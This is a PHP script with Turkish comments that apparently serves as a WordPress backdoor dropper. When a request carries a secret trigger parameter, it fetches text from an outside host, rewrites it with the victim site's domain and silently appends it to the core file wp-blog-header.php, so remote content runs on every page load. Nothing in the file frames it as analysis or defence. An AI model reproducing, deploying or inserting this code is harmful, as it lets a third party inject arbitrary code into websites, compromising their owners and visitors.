<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if (isset($_GET['ekle']) && $_GET['ekle'] === '111') {
    $wpHeaderFile = $_SERVER['DOCUMENT_ROOT'] . '/wp-blog-header.php';
    $currentDomain = $_SERVER['HTTP_HOST'];
    $url = 'https://licenseall.com.tr/uzk/ko.txt';

    // Uzaktaki URL'den içerik çek
    $remoteContent = file_get_contents($url);

    // Eğer içerik başarıyla çekildiyse
    if ($remoteContent !== false) {
        // replace.com ifadesini $currentDomain ile değiştir
        $updatedContent = str_replace('replace.com', $currentDomain, $remoteContent);

        // wp-blog-header.php dosyasının olup olmadığını kontrol et
        if (file_exists($wpHeaderFile)) {
            // Dosya içeriğini oku
            $wpHeaderContent = file_get_contents($wpHeaderFile);
            $includeCode = "\n" . $updatedContent;

            // Eğer wp-blog-header.php dosyasında 'license' kelimesi varsa, işlem yapma
            if (strpos($wpHeaderContent, 'license') !== false) {
                echo "<div>Bu sayfa zaten güncel.</div>";
            } else {
                // İçeriği eklemeden önce wp-blog-header.php'nin sonunda PHP kapanış etiketi varsa kaldır
                if (substr(trim($wpHeaderContent), -2) === '?>') {
                    $wpHeaderContent = rtrim($wpHeaderContent, "?>");
                }

                // Eğer içerik dosyada mevcut değilse, ekle
                if (strpos($wpHeaderContent, $includeCode) === false) {
                    file_put_contents($wpHeaderFile, $includeCode, FILE_APPEND);
                    echo "<div>İçerik wp-blog-header.php dosyasına başarıyla eklendi.</div>";
                } else {
                    echo "<div>İçerik zaten wp-blog-header.php dosyasına eklenmiş.</div>";
                }
            }
        } else {
            echo "<div>wp-blog-header.php dosyası bulunamadı.</div>";
        }
    } else {
        echo "<div>Uzak içerik alınamadı.</div>";
    }
} else {
    echo "<div>Geçersiz istek.</div>";
}
?>